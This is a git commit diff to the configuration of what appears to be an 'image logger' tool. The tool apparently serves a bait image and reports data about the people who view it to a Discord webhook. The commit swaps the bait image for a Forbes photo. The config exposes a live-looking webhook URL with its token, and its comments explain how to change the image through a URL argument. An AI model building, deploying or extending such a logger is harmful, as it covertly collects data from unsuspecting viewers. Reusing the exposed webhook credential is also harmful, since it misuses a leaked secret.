782dd9028beacdc8c588813be99a864db9d5b49b
rudrav21 <valarudra21@gmail.com>
2025-02-02 14:00:34 +0530

    Update img.py

--- api/img.py
+++ api/img.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335506821086969907/MHmAu1632svHPHpsneoFswnxxFV97DAio6bwaPhxV3_fb7dCDOiY-LO3dY31fgm7JOgR",
-    "image": "https://s.imgur.com/images/favicon-32x32.png", # You can also have a custom image by using a URL argument
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
